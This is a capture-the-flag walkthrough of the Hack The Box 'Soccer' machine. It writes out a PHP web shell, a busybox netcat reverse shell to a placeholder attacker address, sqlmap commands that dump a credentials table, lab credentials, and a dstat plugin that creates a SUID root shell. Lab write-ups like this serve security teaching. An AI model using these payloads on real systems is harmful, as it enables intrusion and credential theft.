## Welcome everyone!

Today, we will explore *Soccer*, an easy-rated machine from **Hack The Box**.

Without further ado, let’s get started!

![image](/HTB/Soccer/Soccer_images/1.png)



## Information Gathering


First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target system:

![image](/HTB/Soccer/Soccer_images/2.png)

There are three exposed services running on the target machine:

SSH (Port 22)

HTTP (Port 80)

HTTP (Port 9091)

Moreover, it appears that a redirect to `soccer.htb` is made, which means that we need to add this domain in our `/etc/hosts` file in order to access it.

![image](/HTB/Soccer/Soccer_images/3.png)

We should now be able to access it from our web browser:

![image](/HTB/Soccer/Soccer_images/4.png)

We are greeted with a static HTML page containing nothing particularly useful to us. We can use a tool like **Gobuster** to enumerate potential hidden endpoints or interesting files:

![image](/HTB/Soccer/Soccer_images/5.png)

We successfully identified a hidden `/tiny` endpoint. Let’s attempt to access it:

![image](/HTB/Soccer/Soccer_images/6.png)

The endpoint appears to host a ***Tiny File Manager*** web application protected by a login form. Since we do not have any credentials, let’s check for default credentials related to this web application:

![image](/HTB/Soccer/Soccer_images/7.png)

We just identified two default patterns of credentials. Let’s attempt the first one, which is `admin:admin@123`, on the login panel located at the `/tiny` endpoint:

![image](/HTB/Soccer/Soccer_images/8.png)

![image](/HTB/Soccer/Soccer_images/9.png)

It works! We successfully accessed the restricted dashboard by abusing unchanged default credentials, which is a very bad security practice.

We can identify the web application version at the bottom of the page: v**2.4.3**.

## Initial Access

We will use `searchsploit` in order to see whether a vulnerability exists for this Tiny File Manager version, maybe we could use an existing exploit to gain our initial foothold on the target machine:

![image](/HTB/Soccer/Soccer_images/10.png)

We can identify multiple exploits targeting this web application. One of them is a Bash script that allows Remote Code Execution (RCE) on the target and appears to affect the version running on the target.

![image](/HTB/Soccer/Soccer_images/11.png)

Looking at the script code, we can confirm from the comments that the exploit affects Tiny File Manager up to and including the **v2.4.6**, which is perfect for us because our target is running version 2.4.3.

![image](/HTB/Soccer/Soccer_images/12.png)

Target URL and valid credentials for the web application are required to achieve the RCE.

After giving the Bash script execute permissions with `chmod +x`, we can simply execute the following command:

`./50828.sh http://soccer.htb/tiny admin admin@123`

An initial access can be obtained from there. 

But in my case, I will exploit it manually, from the dashboard directly. Indeed, there is also a way to obtain a foothold on the target system only with our authenticated access.

The Tiny File Manager dashboard allows us to edit multiple web resources and also provides an option to upload content:

![image](/HTB/Soccer/Soccer_images/13.png)

This feature could be sufficient for the next stage of exploitation: if we find a way to upload a **web shell**, we could also achieve RCE. Since PHP code is executed on the website, a webshell.php file containing the following code can be used:

`<?php`

`if (isset($_GET['cmd'])) {
system($_GET['cmd'] . ' 2>&1');
}`

`?>`

 This script allows us to execute arbitrary system commands from our web browser through the `cmd` URL parameter.

Unfortunately, the **www-data** user is not allowed to write data at the `/var/www/html` web root.

![image](/HTB/Soccer/Soccer_images/14.png)

But we know that the `tiny` folder is also editable theoretically, so let’s try at this endpoint:

![image](/HTB/Soccer/Soccer_images/15.png)

It has been rejected as well. But in this `/tiny` folder, there is an intriguing folder that was previously undiscovered:

![image](/HTB/Soccer/Soccer_images/16.png)

A `/uploads` folder exists, which strongly suggests that uploading can be done at this endpoint exclusively. Our malicious PHP script finally gets uploaded at (`/var/www/html`)`/tiny/uploads`:

(For no reason, it wasn’t obvious to upload basically the file, so i did it through a Python server hosting the `webshell.php` file. You can reproduct it as below.)

![image](/HTB/Soccer/Soccer_images/17.png)

Once uploaded, arbitrary system commands can be executed at the following URL:

`http://soccer.htb/tiny/uploads/webshell.php?cmd=SYS_CMD_HERE`

![image](/HTB/Soccer/Soccer_images/18.png)

We successfully achieved remote code execution on the target machine. We can now simply use a `busybox` command initiating a Bash instance that will connect back to a **Netcat listener**, allowing us to obtain a remote access on the target system:

`busybox nc ATTACKER_IP NC_PORT -e sh`

(Don’t forget to set up your listener with `nc -lvnp PORT`)

![image](/HTB/Soccer/Soccer_images/19.png)

The request should hangs in your web browser and the connection should be received by the Netcat listener as above: we successfully obtained initial access on the target system.

Our current shell is limited. It can be upgraded using the following command:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

Once introduced into a system, one of the first things we want to check during the local enumeration phase are the users present on the system because it could reveal a critical misconfiguration leading to a local privilege escalation. We will take a look at the `/etc/passwd` file:

![image](/HTB/Soccer/Soccer_images/20.png)

It appears that a single non-root user is present on the system: **player**.

Can we access its `/home/player` folder?

![image](/HTB/Soccer/Soccer_images/21.png)

We can access its folder, yes, but we need to move from **www-data** to **player** user in order to access the content of the first flag.

## Horizontal Privilege Escalation

After performing a basic local enumeration of the target system, we can identify an intriguing internal subdomain in the `/etc/hosts` file:

![image](/HTB/Soccer/Soccer_images/22.png)

It appears that a `soc-player.soccer.htb` domain can be accessed. Getting back to our own machine, we will add this in our `/etc/hosts` file to enable **DNS resolution.**

Once it has been done, the request should be accessible from our web browser as below:

![image](/HTB/Soccer/Soccer_images/23.png)

The web interface appears very similar to `soccer.htb` previously analyzed. Let’s use **Gobuster** to see whether we can spot any different web resources through **web directory fuzzing**:

![image](/HTB/Soccer/Soccer_images/24.png)

We can identify multiple endpoints that were previously undiscovered. Attempting to access the first `/check` endpoint isn’t conclusive because we need an authenticated access from `/login`:

![image](/HTB/Soccer/Soccer_images/25.png)

So let’s attempt to authenticate ourselves with the credentials we found earlier at `/login`:

![image](/HTB/Soccer/Soccer_images/26.png)

Unfortunately, a email address has to be provided this time, making our credentials useless.

We could attempt to create a test account at `/signup` in order to access the `/check` endpoint:

![image](/HTB/Soccer/Soccer_images/27.png)

Once authenticated, the `/check` web resource is successfully accessed. It appears that we can provide an ID.

Looking at the page's source code, we can see that the value supplied through the `id` parameter is sent directly to a **WebSocket** **endpoint** linked to the port **9091** discovered earlier. This makes it worth testing for injection vulnerabilities.

![image](/HTB/Soccer/Soccer_images/28.png)

We could attempt to provide the web socket URL to `sqlmap` in addition to some data associated with the `id` value identified in order to analyze if any SQL Injection vulnerability can be discovered with the following command:

`sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"123"}' --level=5 --risk=3 --batch`

![image](/HTB/Soccer/Soccer_images/29.png)

It appears that the `id` field is injectable; two SQL Injection vulnerabilities has been identified: **boolean-based** and **time-based**. We could leverage one of these to extract some sensitive information, such as users credentials. We can execute the command once again adding the `--dbs` option to enumerate the available databases:

![image](/HTB/Soccer/Soccer_images/30.png)

We successfully dumped the databases, but one that looks interesting is `soccer_db`. Let’s repeat the command by replacing the `—dbs` option with `-D soccer_db` in addition to the`--tables` switch to enable **table dumping on the** `soccer_db` database:

![image](/HTB/Soccer/Soccer_images/31.png)

A table has successfully been identified. Its content can be dumped with this final command:

`sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"123"}' --level=5  --risk=3 --batch -D soccer_db -T accounts --dump`

![image](/HTB/Soccer/Soccer_images/32.png)

Finally, sensitive information has been extracted by exploiting the identified SQL Injection vulnerability. We now have the password for the **player** user, which allows us to pivot our access through an SSH authentication with the following credentials:

`player:PlayerOftheMatch2022`

![image](/HTB/Soccer/Soccer_images/33.png)

User flag can now be claimed in the current folder:

![image](/HTB/Soccer/Soccer_images/34.png)

## Vertical Privilege Escalation

We now need to find a way to escalate our current privileges to the superuser `root` in order to retrieve the final flag.

Inspecting sudo rules, cron jobs and capabilities doesn’t reveals anything useful for us. However, looking at binaries with **SUID bit** set, we can identify something uncommon:

![image](/HTB/Soccer/Soccer_images/35.png)

a `/usr/local/bin/doas` binary has the SUID bit set on it. Just like **sudo rules**, this could be a dangerous configuration depending on the `/usr/local/etc/doas.conf` configuration file. So let’s take a look at it

![image](/HTB/Soccer/Soccer_images/36.png)

Surprisingly (or not), it appears that the **player** user we just compromised is **permitted** to use this binary **as root** without providing a **pass**word to execute the `/usr/bin/dstat` binary. Since this binary is quite unfamiliar, let’s take a look at GTFOBins, an awesome free online resource providing syntax for **binary exploitation** on Linux during the privilege escalation phase. We will check whether a documentation exists concerning the `dstat` binary;

![image](/HTB/Soccer/Soccer_images/37.png)

It appears that `dstat` supports loading external Python plugins from several directories:

- `/usr/share/dstat`

-`/usr/local/share/dstat`

-`(path of binary)/plugins/`

or
- `~/.dstat/`

These folder paths may contain external `dstat_*.py` plugins that will execute Python code. 

The attack chain is as follows:

Our unprivileged user will run `doas` in order to execute a privileged `dstat` command. If our current user has write permissions on one of the folders listed above, `dstat` could execute any Python code we want to create as external plugins with **root privileges**.

Let’s take a look at the common `/usr/share/dstat` folder permissions to see whether we are able to create our malicious Python script there:

![image](/HTB/Soccer/Soccer_images/38.png)


This folder is **root-owned** only. Let’s check the second folder, `/usr/local/share/dstat`:

![image](/HTB/Soccer/Soccer_images/39.png)

It appears that we have write access for this folder! 

As mentioned earlier, we now have to create a Python script under the following structure:`dstat_NAME.py` to make it accessible to the `dstat` binary. For example we could create a script named `dstat_maliciousfile.py`

Let’s create the following test script:

`import os`

`os.system(”whoami”)`

This script simply returns the word ***root*** if successfully executed as `root`.

![image](/HTB/Soccer/Soccer_images/40.png)

Now, let’s verify if our malicious script can be found and treated by the `dstat` binary using `dstat —-list`; this will allow us to display every Python plugin available on the machine:

![image](/HTB/Soccer/Soccer_images/41.png)

We now have the confirmation that our malicious plugin can be loaded.

Let’s use `doas` to execute `dstat` in a privileged context, allowing arbitrary system commands to be executed with elevated privileges through our malicious Python script:

![image](/HTB/Soccer/Soccer_images/42.png)

It works! We found a way to execute arbitrary system commands with **root privileges**. From this point, we can replace the script we made with the following:

`import os`

`os.system(”cp /bin/sh /tmp/rootbash && chmod +s /tmp/rootbash")`

This script copies the `/bin/sh` binary in an accessible directory, such as `/tmp`. Then, `chmod +s` allows to set the SUID bit on the newly generated `/tmp/rootbash` binary. Since the script will be executed as `root`, the `/tmp/rootbash` binary and its SUID bit will be **root-owned**. Remember, the SUID bit allows a binary to be executed with its owner permissions, this could allow us to spawn a privileged shell as the superuser `root`, concluding in a total compromise of the system.

Look closely the `/tmp` folder before the script execution:

![image](/HTB/Soccer/Soccer_images/43.png)

Although the output tells us that the module failed to load, let’s list the `/tmp` folder again with file permissions:

![image](/HTB/Soccer/Soccer_images/44.png)

It worked, the script has been executed as previously. We can observe that it is root-owned with the SUID bit set on it.

All that’s left to do is to execute the `/tmp/rootbash` binary to spawn a privileged shell. But we  also need to append the `-p` switch in order to prevent the binary from dropping its root privileges as soon as it runs:

![image](/HTB/Soccer/Soccer_images/45.png)

We successfully escalated our privileges to `root`, concluding in a full access and control of the system. The `/root` directory can be accessed, allowing us to retrieve the root flag:

![image](/HTB/Soccer/Soccer_images/46.png)

Challenge completed!

![image](/HTB/Soccer/Soccer_images/47.png)

## Conclusion

This box was very complete, we covered a lot of things.

Starting from a basic web enumeration, we identified an uncommon `/tiny` endpoint hosting a login panel protecting a Tiny File Manager web application. Since default credentials were unchanged, we abused this safety margin to accessed the file manager’s dashboard. We found a way to upload a web shell into a writable folder, allowing us to achieve **remote code execution** on the target, which led us to obtain our initial foothold on the target system as the www-data user. By enumerating locally the machine, we discovered a valid `soc-player` subdomain in the `/etc/hosts` file. We discovered a `/check` endpoint containing an `id` value field vulnerable to SQL Injection. We leveraged this vulnerability to extract the password associated to the `player` user, which allowed us to escalate our privileges horizontally and retrieve the first flag. During the privilege escalation phase, listing SUID binaries allowed us to identify an unusual `doas` binary which works very similarly to `sudo`; the configuration file allowed to the player user to execute in a privileged context the `dstat` binary. This binary could load Python script plugins located in a few folders, one of which we had write access to. This allowed us to create a malicious Python script which consisted of generating a `/bin/sh` binary into an accessible folder before setting on it the SUID bit, which led to a privileged shell granted, concluding in full access and control of the system. 

This challenge perfectly demonstrates how multiple low-severity vulnerabilities can be **chained** together to achieve a total system compromise..

**Thank you for reading!**

![image](/HTB/Soccer/Soccer_images/48.png)
